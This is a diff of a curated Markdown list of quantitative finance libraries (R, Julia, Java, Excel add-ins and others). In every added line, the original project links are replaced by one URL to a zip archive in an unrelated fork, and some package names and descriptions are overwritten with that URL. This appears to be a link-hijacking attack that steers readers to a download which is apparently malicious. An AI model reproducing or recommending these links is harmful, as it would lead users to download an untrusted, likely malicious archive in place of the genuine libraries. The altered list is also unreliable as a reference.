-- [expy](http://www.bnikolic.co.uk/expy/expy.html) - The ExPy add-in allows easy use of Python directly from within an Microsoft Excel spreadsheet, both to execute arbitrary code and to define new Excel functions.
-- [pyxll](https://www.pyxll.com) - PyXLL is an Excel add-in that enables you to extend Excel using nothing but Python code.
+- [xlwings](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Make Excel fly with Python.
+- [openpyxl](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Read/Write Excel 2007 xlsx/xlsm files.
+- [xlrd](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Library for developers to extract data from Microsoft Excel spreadsheet files.
+- [xlsxwriter](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Write files in the Excel 2007+ XLSX file format.
+- [xlwt](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Library to create spreadsheet files compatible with MS Excel 97/2000/XP/2003 XLS files, on any platform.
+- [DataNitro](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - DataNitro also offers full-featured Python-Excel integration, including UDFs. Trial downloads are available, but users must purchase a license.
+- [xlloop](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - XLLoop is an open source framework for implementing Excel user-defined functions (UDFs) on a centralised server (a function server).
+- [expy](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - The ExPy add-in allows easy use of Python directly from within an Microsoft Excel spreadsheet, both to execute arbitrary code and to define new Excel functions.
+- [pyxll](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - PyXLL is an Excel add-in that enables you to extend Excel using nothing but Python code.
 
 ## R
 
 ### Numerical Libraries & Data Structures
 
-- [xts](https://cran.r-project.org/web/packages/xts/index.html) - eXtensible Time Series: Provide for uniform handling of R's different time-based data classes by extending zoo, maximizing native format information preservation and allowing for user level customization and extension, while simplifying cross-class interoperability.
-- [data.table](https://cran.r-project.org/web/packages/data.table/index.html) - Extension of data.frame: Fast aggregation of large data (e.g. 100GB in RAM), fast ordered joins, fast add/modify/delete of columns by group using no copies at all, list columns and a fast file reader (fread). Offers a natural and flexible syntax, for faster development.
-- [sparseEigen](https://github.com/dppalomar/sparseEigen) - Sparse pricipal component analysis.
-- [TSdbi](http://tsdbi.r-forge.r-project.org/) - Provides a common interface to time series databases.
-- [tseries](https://cran.r-project.org/web/packages/tseries/index.html) - Time Series Analysis and Computational Finance.
-- [zoo](https://cran.r-project.org/web/packages/zoo/index.html) - S3 Infrastructure for Regular and Irregular Time Series (Z's Ordered Observations).
-- [tis](https://cran.r-project.org/web/packages/tis/index.html) - Functions and S3 classes for time indexes and time indexed series, which are compatible with FAME frequencies.
-- [tfplot](https://cran.r-project.org/web/packages/tfplot/index.html) - Utilities for simple manipulation and quick plotting of time series data.
-- [tframe](https://cran.r-project.org/web/packages/tframe/index.html) - A kernel of functions for programming time series methods in a way that is relatively independently of the representation of time.
+- [xts](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - eXtensible Time Series: Provide for uniform handling of R's different time-based data classes by extending zoo, maximizing native format information preservation and allowing for user level customization and extension, while simplifying cross-class interoperability.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Extension of https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip Fast aggregation of large data (e.g. 100GB in RAM), fast ordered joins, fast add/modify/delete of columns by group using no copies at all, list columns and a fast file reader (fread). Offers a natural and flexible syntax, for faster development.
+- [sparseEigen](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Sparse pricipal component analysis.
+- [TSdbi](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Provides a common interface to time series databases.
+- [tseries](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Time Series Analysis and Computational Finance.
+- [zoo](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - S3 Infrastructure for Regular and Irregular Time Series (Z's Ordered Observations).
+- [tis](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Functions and S3 classes for time indexes and time indexed series, which are compatible with FAME frequencies.
+- [tfplot](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Utilities for simple manipulation and quick plotting of time series data.
+- [tframe](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A kernel of functions for programming time series methods in a way that is relatively independently of the representation of time.
 
 ### Data Sources
 
-- [IBrokers](https://cran.r-project.org/web/packages/IBrokers/index.html) - Provides native R access to Interactive Brokers Trader Workstation API.
-- [Rblpapi](https://cran.r-project.org/web/packages/Rblpapi/index.html) - An R Interface to 'Bloomberg' is provided via the 'Blp API'.
-- [Quandl](https://www.quandl.com/tools/r) - Get Financial Data Directly Into R.
-- [Rbitcoin](https://cran.r-project.org/web/packages/Rbitcoin/index.html) - Unified markets API interface (bitstamp, kraken, btce, bitmarket).
-- [GetTDData](https://cran.r-project.org/web/packages/GetTDData/index.html) - Downloads and aggregates data for Brazilian government issued bonds directly from the website of Tesouro Direto.
-- [GetHFData](https://cran.r-project.org/web/packages/GetHFData/index.html) - Downloads and aggregates high frequency trading data for Brazilian instruments directly from Bovespa ftp site.
+- [IBrokers](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Provides native R access to Interactive Brokers Trader Workstation API.
+- [Rblpapi](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - An R Interface to 'Bloomberg' is provided via the 'Blp API'.
+- [Quandl](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Get Financial Data Directly Into R.
+- [Rbitcoin](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Unified markets API interface (bitstamp, kraken, btce, bitmarket).
+- [GetTDData](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Downloads and aggregates data for Brazilian government issued bonds directly from the website of Tesouro Direto.
+- [GetHFData](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Downloads and aggregates high frequency trading data for Brazilian instruments directly from Bovespa ftp site.
 
 ### Financial Instruments and Pricing
 
-- [RQuantLib](http://dirk.eddelbuettel.com/code/rquantlib.html) - RQuantLib connects GNU R with QuantLib.
-- [quantmod](https://cran.r-project.org/web/packages/quantmod/index.html) - Quantitative Financial Modelling Framework.
-- [Rmetrics](https://www.rmetrics.org) - The premier open source software solution for teaching and training quantitative finance.
-	- [fAsianOptions](https://cran.r-project.org/web/packages/fAsianOptions/index.html) - EBM and Asian Option Valuation.
-	- [fAssets](https://cran.r-project.org/web/packages/fAssets/index.html) - Analysing and Modelling Financial Assets.
-	- [fBasics](https://cran.r-project.org/web/packages/fBasics/index.html) - Markets and Basic Statistics.
-	- [fBonds](https://cran.r-project.org/web/packages/fBonds/index.html) - Bonds and Interest Rate Models.
-	- [fExoticOptions](https://cran.r-project.org/web/packages/fExoticOptions/index.html) - Exotic Option Valuation.
-	- [fOptions](https://cran.r-project.org/web/packages/fOptions/index.html) - Pricing and Evaluating Basic Options.
-	- [fPortfolio](https://cran.r-project.org/web/packages/fPortfolio/index.html) - Portfolio Selection and Optimization.
-- [portfolio](https://cran.r-project.org/web/packages/portfolio/index.html) - Analysing equity portfolios.
-- [portfolioSim](https://cran.r-project.org/web/packages/portfolioSim/index.html) - Framework for simulating equity portfolio strategies.
-- [sparseIndexTracking](https://github.com/dppalomar/sparseIndexTracking) - Portfolio design to track an index.
-- [covFactorModel](https://github.com/dppalomar/covFactorModel) - Covariance matrix estimation via factor models.
-- [riskParityPortfolio](https://github.com/dppalomar/riskParityPortfolio) - Blazingly fast design of risk parity portfolios.
-- [sde](https://cran.r-project.org/web/packages/sde/index.html) - Simulation and Inference for Stochastic Differential Equations.
-- [YieldCurve](https://cran.r-project.org/web/packages/YieldCurve/index.html) - Modelling and estimation of the yield curve.
-- [SmithWilsonYieldCurve](https://cran.r-project.org/web/packages/SmithWilsonYieldCurve/index.html) - Constructs a yield curve by the Smith-Wilson method from a table of LIBOR and SWAP rates.
-- [ycinterextra](https://cran.r-project.org/web/packages/ycinterextra/index.html) - Yield curve or zero-coupon prices interpolation and extrapolation.
-- [AmericanCallOpt](https://cran.r-project.org/web/packages/AmericanCallOpt/index.html) - This package includes pricing function for selected American call options with underlying assets that generate payouts.
-- [VarSwapPrice](https://cran.r-project.org/web/packages/VarSwapPrice/index.html) - Pricing a variance swap on an equity index.
-- [RND](https://cran.r-project.org/web/packages/RND/index.html) - Risk Neutral Density Extraction Package.
-- [LSMonteCarlo](https://cran.r-project.org/web/packages/LSMonteCarlo/index.html) - American options pricing with Least Squares Monte Carlo method.
-- [OptHedging](https://cran.r-project.org/web/packages/OptHedging/index.html) - Estimation of value and hedging strategy of call and put options.
-- [tvm](https://cran.r-project.org/web/packages/tvm/index.html) - Time Value of Money Functions.
-- [OptionPricing](https://cran.r-project.org/web/packages/OptionPricing/index.html) - Option Pricing with Efficient Simulation Algorithms.
-- [credule](https://cran.r-project.org/web/packages/credule/index.html) - Credit Default Swap Functions.
-- [derivmkts](https://cran.r-project.org/web/packages/derivmkts/index.html) - Functions and R Code to Accompany Derivatives Markets.
-- [FinCal](https://github.com/felixfan/FinCal) - Package for time value of money calculation, time series analysis and computational finance.
-- [r-quant](https://github.com/artyyouth/r-quant) - R code for quantitative analysis in finance.
-- [options.studies](https://github.com/taylorizing/options.studies) - options trading studies functions for use with options.data package and shiny.
+- [RQuantLib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - RQuantLib connects GNU R with QuantLib.
+- [quantmod](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Quantitative Financial Modelling Framework.
+- [Rmetrics](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - The premier open source software solution for teaching and training quantitative finance.
+	- [fAsianOptions](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - EBM and Asian Option Valuation.
+	- [fAssets](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Analysing and Modelling Financial Assets.
+	- [fBasics](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Markets and Basic Statistics.
+	- [fBonds](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Bonds and Interest Rate Models.
+	- [fExoticOptions](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Exotic Option Valuation.
+	- [fOptions](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Pricing and Evaluating Basic Options.
+	- [fPortfolio](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Portfolio Selection and Optimization.
+- [portfolio](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Analysing equity portfolios.
+- [portfolioSim](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Framework for simulating equity portfolio strategies.
+- [sparseIndexTracking](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Portfolio design to track an index.
+- [covFactorModel](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Covariance matrix estimation via factor models.
+- [riskParityPortfolio](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Blazingly fast design of risk parity portfolios.
+- [sde](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Simulation and Inference for Stochastic Differential Equations.
+- [YieldCurve](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Modelling and estimation of the yield curve.
+- [SmithWilsonYieldCurve](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Constructs a yield curve by the Smith-Wilson method from a table of LIBOR and SWAP rates.
+- [ycinterextra](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Yield curve or zero-coupon prices interpolation and extrapolation.
+- [AmericanCallOpt](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - This package includes pricing function for selected American call options with underlying assets that generate payouts.
+- [VarSwapPrice](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Pricing a variance swap on an equity index.
+- [RND](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Risk Neutral Density Extraction Package.
+- [LSMonteCarlo](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - American options pricing with Least Squares Monte Carlo method.
+- [OptHedging](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Estimation of value and hedging strategy of call and put options.
+- [tvm](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Time Value of Money Functions.
+- [OptionPricing](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Option Pricing with Efficient Simulation Algorithms.
+- [credule](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Credit Default Swap Functions.
+- [derivmkts](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Functions and R Code to Accompany Derivatives Markets.
+- [FinCal](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Package for time value of money calculation, time series analysis and computational finance.
+- [r-quant](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - R code for quantitative analysis in finance.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - options trading studies functions for use with https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip package and shiny.
 
 ### Trading
 
-- [TA-Lib](https://ta-lib.org) - perform technical analysis of financial market data.
-- [backtest](https://cran.r-project.org/web/packages/backtest/index.html) - Exploring Portfolio-Based Conjectures About Financial Instruments.
-- [pa](https://cran.r-project.org/web/packages/pa/index.html) - Performance Attribution for Equity Portfolios.
-- [TTR](https://cran.r-project.org/web/packages/TTR/index.html) - Technical Trading Rules.
-- [QuantTools](https://quanttools.bitbucket.io/_site/index.html) - Enhanced Quantitative Trading Modelling.
+- [TA-Lib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - perform technical analysis of financial market data.
+- [backtest](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Exploring Portfolio-Based Conjectures About Financial Instruments.
+- [pa](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Performance Attribution for Equity Portfolios.
+- [TTR](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Technical Trading Rules.
+- [QuantTools](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Enhanced Quantitative Trading Modelling.
 
 ### Risk Analysis
 
-- [PerformanceAnalytics](https://cran.r-project.org/web/packages/PerformanceAnalytics/index.html) - Econometric tools for performance and risk analysis.
+- [PerformanceAnalytics](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Econometric tools for performance and risk analysis.
 
 ### Time Series
 
-- [tseries](https://cran.r-project.org/web/packages/tseries/index.html) - Time Series Analysis and Computational Finance.
-- [zoo](https://cran.r-project.org/web/packages/zoo/index.html) - S3 Infrastructure for Regular and Irregular Time Series (Z's Ordered Observations).
-- [xts](https://cran.r-project.org/web/packages/xts/index.html) - eXtensible Time Series.
-- [fGarch](https://cran.r-project.org/web/packages/fGarch/index.html) - Rmetrics - Autoregressive Conditional Heteroskedastic Modelling.
-- [timeSeries](https://cran.r-project.org/web/packages/timeSeries/index.html) - Rmetrics - Financial Time Series Objects.
-- [rugarch](https://cran.r-project.org/web/packages/rugarch/index.html) - Univariate GARCH Models.
-- [rmgarch](https://cran.r-project.org/web/packages/rmgarch/index.html) - Multivariate GARCH Models.
-- [tidypredict](https://github.com/edgararuiz/tidypredict) - Run predictions inside the database <https://tidypredict.netlify.com/>.
-- [tidyquant](https://github.com/business-science/tidyquant) - Bringing financial analysis to the tidyverse.
-- [timetk](https://github.com/business-science/timetk) - A toolkit for working with time series in R.
-- [tibbletime](https://github.com/business-science/tibbletime) - Built on top of the tidyverse, tibbletime is an extension that allows for the creation of time aware tibbles through the setting of a time index.
+- [tseries](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Time Series Analysis and Computational Finance.
+- [zoo](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - S3 Infrastructure for Regular and Irregular Time Series (Z's Ordered Observations).
+- [xts](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - eXtensible Time Series.
+- [fGarch](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Rmetrics - Autoregressive Conditional Heteroskedastic Modelling.
+- [timeSeries](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Rmetrics - Financial Time Series Objects.
+- [rugarch](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Univariate GARCH Models.
+- [rmgarch](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Multivariate GARCH Models.
+- [tidypredict](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Run predictions inside the database <https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip>.
+- [tidyquant](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Bringing financial analysis to the tidyverse.
+- [timetk](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A toolkit for working with time series in R.
+- [tibbletime](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Built on top of the tidyverse, tibbletime is an extension that allows for the creation of time aware tibbles through the setting of a time index.
 
 ### Calendars
 
-- [timeDate](https://cran.r-project.org/web/packages/timeDate/index.html) - Chronological and Calendar Objects
-- [bizdays](https://cran.r-project.org/web/packages/bizdays/index.html) - Business days calculations and utilities
+- [timeDate](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Chronological and Calendar Objects
+- [bizdays](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Business days calculations and utilities
 
 ## Matlab
 
 ### FrameWorks
 
-- [QUANTAXIS](https://github.com/yutiansut/quantaxis) - Integrated Quantitative Toolbox with Matlab.
+- [QUANTAXIS](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Integrated Quantitative Toolbox with Matlab.
 
 
 ## Julia
 
-- [QuantLib.jl](https://github.com/pazzo83/QuantLib.jl) - Quantlib implementation in pure Julia.
-- [FinancialMarkets.jl](https://github.com/imanuelcostigan/FinancialMarkets.jl) - Describe and model financial markets objects using Julia.
-- [Ito.jl](https://github.com/aviks/Ito.jl) - A Julia package for quantitative finance.
-- [TALib.jl](https://github.com/femtotrader/TALib.jl) - A Julia wrapper for TA-Lib.
-- [Miletus.jl](https://juliacomputing.com/docs/miletus/index.html) - A financial contract definition, modeling language, and valuation framework.
-- [Temporal.jl](https://github.com/dysonance/Temporal.jl) - Flexible and efficient time series class & methods.
-- [Indicators.jl](https://github.com/dysonance/Indicators.jl) - Financial market technical analysis & indicators on top of Temporal.
-- [Strategems.jl](https://github.com/dysonance/Strategems.jl) - Quantitative systematic trading strategy development and backtesting.
-- [TimeSeries.jl](https://github.com/JuliaStats/TimeSeries.jl) - Time series toolkit for Julia.
-- [MarketTechnicals.jl](https://github.com/JuliaQuant/MarketTechnicals.jl) - Technical analysis of financial time series on top of TimeSeries.
-- [MarketData.jl](https://github.com/JuliaQuant/MarketData.jl) - Time series market data.
-- [TimeFrames.jl](https://github.com/femtotrader/TimeFrames.jl) - A Julia library that defines TimeFrame (essentially for resampling TimeSeries).
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Quantlib implementation in pure Julia.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Describe and model financial markets objects using Julia.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A Julia package for quantitative finance.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A Julia wrapper for TA-Lib.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A financial contract definition, modeling language, and valuation framework.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Flexible and efficient time series class & methods.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Financial market technical analysis & indicators on top of Temporal.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Quantitative systematic trading strategy development and backtesting.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Time series toolkit for Julia.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Technical analysis of financial time series on top of TimeSeries.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Time series market data.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A Julia library that defines TimeFrame (essentially for resampling TimeSeries).
 
 
 ## Java
 
-- [Strata](http://strata.opengamma.io/) - Modern open-source analytics and market risk library designed and written in Java.
-- [JQuantLib](http://www.jquantlib.org) - JQuantLib is a free, open-source, comprehensive framework for quantitative finance, written in 100% Java.
-- [finmath.net](http://finmath.net) - Java library with algorithms and methodologies related to mathematical finance.
-- [quantcomponents](https://github.com/lsgro/quantcomponents) - Free Java components for Quantitative Finance and Algorithmic Trading.
-- [DRIP](https://lakshmidrip.github.io/DRIP) - Fixed Income, Asset Allocation, Transaction Cost Analysis, XVA Metrics Libraries.
+- [Strata](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Modern open-source analytics and market risk library designed and written in Java.
+- [JQuantLib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - JQuantLib is a free, open-source, comprehensive framework for quantitative finance, written in 100% Java.
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Java library with algorithms and methodologies related to mathematical finance.
+- [quantcomponents](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Free Java components for Quantitative Finance and Algorithmic Trading.
+- [DRIP](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Fixed Income, Asset Allocation, Transaction Cost Analysis, XVA Metrics Libraries.
 
 ## JavaScript
 
 ### Data Visualization
-- [QUANTAXIS_Webkit](https://github.com/yutiansut/QUANTAXIS_Webkit) an awesome visualization center based on quantaxis.
+- [QUANTAXIS_Webkit](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) an awesome visualization center based on quantaxis.
 
 ## Haskell
 
-- [quantfin](https://github.com/boundedvariation/quantfin) - quant finance in pure haskell.
-- [hqfl](https://github.com/co-category/hqfl) - Haskell Quantitative Finance Library.
+- [quantfin](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - quant finance in pure haskell.
+- [hqfl](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Haskell Quantitative Finance Library.
 
 ## Scala
 
-- [QuantScale](https://github.com/choucrifahed/quantscale) - Scala Quantitative Finance Library.
-- [Scala Quant](https://github.com/frankcash/Scala-Quant) Scala library for working with stock data from IFTTT recipes or Google Finance.
+- [QuantScale](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Scala Quantitative Finance Library.
+- [Scala Quant](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) Scala library for working with stock data from IFTTT recipes or Google Finance.
 
 ## Ruby
 
-- [Jiji](https://github.com/unageanu/jiji2) - Open Source Forex algorithmic trading framework using OANDA REST API.
+- [Jiji](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Open Source Forex algorithmic trading framework using OANDA REST API.
 
 ## Frameworks
 
-- [QuantLib](https://www.quantlib.org) - The QuantLib project is aimed at providing a comprehensive software framework for quantitative finance.
-	- [JQuantLib](http://www.jquantlib.org) - Java port.
-	- [RQuantLib](http://dirk.eddelbuettel.com/code/rquantlib.html) - R port.
-	- [QuantLibAddin](https://www.quantlib.org/quantlibaddin/) - Excel support.
-	- [QuantLibXL](https://www.quantlib.org/quantlibxl/) - Excel support.
-	- [QLNet](https://github.com/amaggiulli/qlnet) - .Net port.
-	- [PyQL](https://github.com/enthought/pyql) - Python port.
-	- [QuantLib.jl](https://github.com/pazzo83/QuantLib.jl) - Julia port.
-- [TA-Lib](https://ta-lib.org) - perform technical analysis of financial market data.
+- [QuantLib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - The QuantLib project is aimed at providing a comprehensive software framework for quantitative finance.
+	- [JQuantLib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Java port.
+	- [RQuantLib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - R port.
+	- [QuantLibAddin](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Excel support.
+	- [QuantLibXL](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Excel support.
+	- [QLNet](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - .Net port.
